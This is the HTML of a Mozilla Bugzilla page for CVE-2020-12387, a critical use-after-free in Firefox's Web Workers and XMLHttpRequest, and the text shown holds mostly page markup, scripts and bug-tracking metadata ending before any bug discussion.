<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1545345 - (CVE-2020-12387) Web Workers -  Use After Free with XMLHttpRequest">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1545345">
<meta property="og:description"
      content="RESOLVED (bugmail) in Core - DOM: Workers. Last updated 2020-08-08.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="P1">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1545345 - (CVE-2020-12387) Web Workers -  Use After Free with XMLHttpRequest</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1545345&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1545345">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1545345">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/yui.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/global.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/util.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"types\":[\"tracking\"],\"flags\":{\"tracking\":{\"cf_status_firefox94\":\"---\",\"cf_tracking_thunderbird_esr78\":\"---\",\"cf_status_firefox_esr91\":\"---\",\"cf_status_firefox70\":\"wontfix\",\"cf_tracking_firefox95\":\"---\",\"cf_status_firefox73\":\"wontfix\",\"cf_tracking_firefox93\":\"---\",\"cf_tracking_firefox73\":\"+\",\"cf_tracking_firefox75\":\"+\",\"cf_status_firefox76\":\"fixed\",\"cf_tracking_firefox71\":\"+\",\"cf_status_firefox69\":\"wontfix\",\"cf_status_firefox_esr68\":\"fixed\",\"cf_status_firefox75\":\"wontfix\",\"cf_tracking_firefox70\":\"+\",\"cf_status_firefox_esr78\":\"---\",\"cf_tracking_firefox_esr91\":\"---\",\"cf_tracking_firefox_relnote\":\"---\",\"cf_tracking_firefox69\":\"+\",\"cf_status_firefox71\":\"wontfix\",\"cf_tracking_firefox94\":\"---\",\"cf_tracking_firefox74\":\"+\",\"cf_tracking_firefox72\":\"+\",\"cf_tracking_firefox76\":\"+\",\"cf_status_firefox95\":\"---\",\"cf_tracking_firefox_esr68\":\"76+\",\"cf_status_firefox93\":\"---\",\"cf_tracking_thunderbird_esr91\":\"---\",\"cf_status_thunderbird_esr91\":\"---\",\"cf_status_firefox72\":\"wontfix\",\"cf_status_firefox68\":\"wontfix\",\"cf_status_firefox74\":\"wontfix\",\"cf_tracking_firefox_esr78\":\"---\",\"cf_status_thunderbird_esr78\":\"---\"},\"project\":{\"cf_root_cause\":\"---\",\"cf_tracking_firefox_sumo\":\"---\",\"cf_fission_milestone\":\"---\",\"cf_a11y_review_project_flag\":\"---\",\"cf_webcompat_priority\":\"---\"}},\"comments\":{\"cf_tracking_firefox_sumo\":{\"none-needed\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox70\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr78\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox69\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox93\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox74\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox75\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox73\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox72\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox76\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox71\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr68\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_a11y_review_project_flag\":{\"requested\":\"Description:\\nPlease provide an explanation of the feature or change. Include a description of the user scenario in which it would be used and how the user would complete the task(s).\\nScreenshots and visual UI specs are welcome, but please include sufficient accompanying explanation so that blind members of the accessibility team are able to understand the feature\/change.\\n\\nHow do we test this?\\nIf there is an implementation to test, please provide instructions for testing it; e.g. setting preferences, other preparation, how to trigger the UI, etc.\\n\\nWhen will this ship?\\nTracking bug\/issue:\\nDesign documents (e.g. Product Requirements Document, UI spec):\\nEngineering lead:\\nProduct manager:\\n\\nThe accessibility team has developed the Mozilla Accessibility Release Guidelines which outline what is needed to make user interfaces accessible:\\nhttps:\/\/wiki.mozilla.org\/Accessibility\/Guidelines\\nPlease describe the accessibility guidelines you considered and what steps you\'ve taken to address them:\\n\\nDescribe any areas of concern to which you want the accessibility team to give special attention:\"}}}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1545345;
  BUGZILLA.bug_title = '1545345 - (CVE-2020-12387) Web Workers -  Use After Free with XMLHttpRequest';
  BUGZILLA.bug_summary = 'Web Workers -  Use After Free with XMLHttpRequest';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1545345';
  BUGZILLA.bug_keywords = 'csectype-uaf, sec-critical',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/field.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/comments.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="rO9vVKPoG2dA5WqX2Nulmqi16hsXIlEVWLcFJbRE1SE3jchr" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1545345">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1545345"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1545345 - (CVE-2020-12387) Web Workers - Use After Free with XMLHttpRequest">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="285bCXNeCWk5IM5g50byCQaqip5tSy8JUHLCpRi3rEoDsDBx39aKLG5SWP3upRq90Rv2OY4828hZYNDN6Z7Tcq63LERjMLqMy55C7jrGjLIUNZto4cAjssJcAkwfutdeAb4KLVtBq4P2jJN9AlJl95aSXvjLjkHIrbHL482NOaoo1VEI8AZD6XBvOsloZ5dvovM0NzgblewUD7miuTSQuZNK25TcyHxg4xVfU4Mqyotlt0UtpJt6BSOmQuHrIYvk">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1545345" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635623420-MR6oKejN2ZB0HIPGYKKI69VFj0S768_X5ysj2hHSvFE">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1545345" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1545345" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1545345">Bug 1545345</a>
          <span class="edit-hide">(CVE-2020-12387)</span>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2019-04-17 21:44 PDT" data-time="1555562675">3 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2020-03-28 02:38 PDT" data-time="1585388297">2 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">Web Workers -  Use After Free with XMLHttp<wbr>Request</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            Web Workers -  Use After Free with XMLHttpRequest

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Core :: DOM: Workers, defect, P1)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Core
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Core</div>
            <div class="description">Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the <a href="https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox">Firefox</a> product. (<a href="https://wiki.mozilla.org/Modules/All#Core">More info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Core"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core&component=DOM%3A%20Workers#DOM%3A%20Workers" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">DOM: Workers
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Core :: DOM: Workers</div>
            <div class="description">This component covers the <a href="https://developer.mozilla.org/En/DOM/Worker">Web Workers</a> implementation in Gecko.</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;component=DOM%3A%20Workers&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Core&amp;component=DOM%3A%20Workers&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Core&amp;component=DOM%3A%20Workers"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core" data-component="DOM: Workers"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-version"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            68 Branch

        </span>
    </div>

  
</div>

    <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">P1
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            critical

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_points" style="display:none"
>
    <div class="name">Points:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_points">
            ---

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (<span id="readable-bug-status" data-readable-bug-status="{&quot;resolution&quot;:&quot;FIXED&quot;,&quot;priority&quot;:&quot;P1&quot;,&quot;cf_tracking_firefox70&quot;:&quot;+&quot;,&quot;cf_webcompat_priority&quot;:&quot;---&quot;,&quot;id&quot;:1545345,&quot;cf_status_firefox76&quot;:&quot;fixed&quot;,&quot;flags&quot;:[{&quot;name&quot;:&quot;sec-bounty&quot;,&quot;status&quot;:&quot;+&quot;},{&quot;status&quot;:&quot;-&quot;,&quot;name&quot;:&quot;qe-verify&quot;}],&quot;cf_tracking_firefox71&quot;:&quot;+&quot;,&quot;cf_tracking_thunderbird_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox94&quot;:&quot;---&quot;,&quot;cf_status_firefox72&quot;:&quot;wontfix&quot;,&quot;cf_status_thunderbird_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox93&quot;:&quot;---&quot;,&quot;cf_root_cause&quot;:&quot;---&quot;,&quot;keywords&quot;:[&quot;csectype-uaf&quot;,&quot;sec-critical&quot;],&quot;target_milestone&quot;:&quot;mozilla76&quot;,&quot;cf_tracking_firefox74&quot;:&quot;+&quot;,&quot;cf_tracking_firefox94&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr68&quot;:&quot;76+&quot;,&quot;cf_status_firefox95&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_relnote&quot;:&quot;---&quot;,&quot;cf_status_firefox71&quot;:&